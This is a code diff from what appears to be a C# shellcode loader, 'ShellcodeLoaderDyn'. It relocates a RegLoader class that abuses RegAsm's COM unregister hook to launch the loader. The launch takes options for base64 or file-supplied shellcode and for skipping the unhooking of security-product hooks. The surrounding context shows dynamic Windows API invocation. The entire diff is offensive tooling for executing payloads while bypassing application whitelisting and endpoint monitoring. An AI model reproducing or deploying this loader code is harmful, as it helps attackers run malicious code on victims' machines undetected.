@@ -10,6 +10,36 @@ using System.EnterpriseServices;
 
 namespace ShellcodeLoaderDyn
 {
+    public class RegLoader : ServicedComponent
+    {
+        public RegLoader() { Console.WriteLine("I am a basic COM Object"); }
+
+        [ComUnregisterFunction]
+        public static void UnRegisterClass(string key)
+        {
+            Console.WriteLine("RegAsm mode engaged");
+            List<string> args = new List<string>();
+            foreach (string arg in Environment.GetCommandLineArgs())
+            {
+                switch (arg.Split('=')[0]) {
+                    case "--no-unhook":
+                        args.Add(arg.Split('=')[0]);
+                        break;
+                    case "--file":
+                        args.Add(arg.Split('=')[1]);
+                        break;
+                    case "--base64":
+                        args.Add("--base64");
+                        args.Add(arg.Split('=')[1]);
+                        break;
+                    default:
+                        break;
+                }
+            }
+
+            Program.Main(args.ToArray());
+        }
+    }
     public class Delegates
     {
         [UnmanagedFunctionPointer(CallingConvention.StdCall)]
@@ -1397,37 +1427,6 @@ namespace ShellcodeLoaderDyn
             DI.Generic.DynamicAPIInvoke("kernel32.dll", "WaitForSingleObject", typeof(Delegates.WaitForSingleObject), ref wait_parameters);
             Console.WriteLine("DONE!");
             return 0;
-        }
-    }
-
-    public class RegLoader : ServicedComponent
-    {
-        public RegLoader() { Console.WriteLine("I am a basic COM Object"); }
-
-        [ComUnregisterFunction]
-        public static void UnRegisterClass(string key)
-        {
-            Console.WriteLine("RegAsm loading mode engaged");
-            List<string> args = new List<string>();
-            foreach (string arg in Environment.GetCommandLineArgs())
-            {
-                switch (arg.Split('=')[0]) {
-                    case "--no-unhook":
-                        args.Add(arg.Split('=')[0]);
-                        break;
-                    case "--file":
-                        args.Add(arg.Split('=')[1]);
-                        break;
-                    case "--base64":
-                        args.Add("--base64");
-                        args.Add(arg.Split('=')[1]);
-                        break;
-                    default:
-                        break;
-                }
-            }
-
-            Program.Main(args.ToArray());
         }
     }
 }
